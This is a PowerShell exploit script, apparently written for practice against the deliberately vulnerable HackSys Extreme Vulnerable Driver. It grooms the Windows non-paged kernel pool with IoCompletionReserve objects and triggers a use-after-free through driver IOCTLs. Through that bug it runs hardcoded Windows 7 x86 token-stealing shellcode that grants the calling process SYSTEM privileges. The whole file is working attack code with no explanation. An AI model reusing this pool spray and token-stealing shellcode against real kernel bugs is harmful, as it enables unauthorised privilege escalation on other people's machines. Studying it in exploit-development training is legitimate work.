Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
  
public static class EVD
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
  
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern Byte CloseHandle(
    	IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtAllocateReserveObject(
    	ref IntPtr hObject,
		UInt32  ObjectAttributes,
		UInt32 ObjectType);
}
"@

function IoCo-PoolSpray {
	echo "[+] Derandomizing NonPagedPool.."
	$Spray = @()
	for ($i=0;$i -lt 10000;$i++) {
		$hObject = [IntPtr]::Zero
		$CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
		if ($CallResult -eq 0) {
			$Spray += $hObject
		}
	}
	$Script:IoCo_hArray1 += $Spray
	echo "[+] $($IoCo_hArray1.Length) IoCo objects created!"

	echo "[+] Allocating sequential objects.."
	$Spray = @()
	for ($i=0;$i -lt 5000;$i++) {
		$hObject = [IntPtr]::Zero
		$CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
		if ($CallResult -eq 0) {
			$Spray += $hObject
		}
	}
	$Script:IoCo_hArray2 += $Spray
	echo "[+] $($IoCo_hArray2.Length) IoCo objects created!"

	echo "[+] Creating non-paged pool holes.."
	for ($i=0;$i -lt $($IoCo_hArray2.Length);$i+=2) {
		$CallResult = [EVD]::CloseHandle($IoCo_hArray2[$i])
		if ($CallResult -ne 0) {
			$FreeCount += 1
		}
	}
	echo "[+] Free'd $FreeCount IoCo objects!"
}

# Compiled with Keystone-Engine
# Hardcoded offsets for Win7 x86 SP1
$Shellcode = [Byte[]] @(
    #---[Setup]
    0x60,                               # pushad
    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]
    0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]
    0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)
    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
    #---[Copy System PID token]
    0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)
    0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] <-|
    0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |
    0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |
    0x75, 0xED,                         # jnz                           ->|
    0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
    0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
    #---[Recover]
    0x61,                               # popad
    0xC3                                # ret
)
 
# Write shellcode to memory
echo "`n[>] Allocating ring0 payload.."
[IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Pointer, $Shellcode.Length)
$ShellcodePointer = [System.BitConverter]::GetBytes($Pointer.ToInt32())
echo "[+] Payload size: $($Shellcode.Length)"
echo "[+] Payload address: 0x$("{0:X8}" -f $Pointer.ToInt32())"
  
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
  
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}

echo "`n[>] Spraying non-paged kernel pool!"
IoCo-PoolSpray

echo "`n[>] Staging vulnerability.."
# Allocate UAF Object
#---
# 0x222013 - HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT
echo "[+] Allocating UAF object"
[EVD]::DeviceIoControl($hDevice, 0x222013, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null

# Free UAF Object
#---
# 0x22201B - HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT
echo "[+] Freeing UAF object"
[EVD]::DeviceIoControl($hDevice, 0x22201B, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null

# Fake Object allocation
#---
# 0x22201F - HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT
echo "[+] Spraying 5000 fake objects"
$Buffer = $ShellcodePointer + [Byte[]](0x42)*0x5B + 0x00 # len = 0x60
for ($i=0;$i -lt 5000;$i++){
	[EVD]::DeviceIoControl($hDevice, 0x22201F, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
}

# Trigger stale callback
#---
# 0x222017 - HACKSYS_EVD_IOCTL_USE_UAF_OBJECT
echo "`n[>] Triggering UAF vulnerability!`n"
[EVD]::DeviceIoControl($hDevice, 0x222017, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null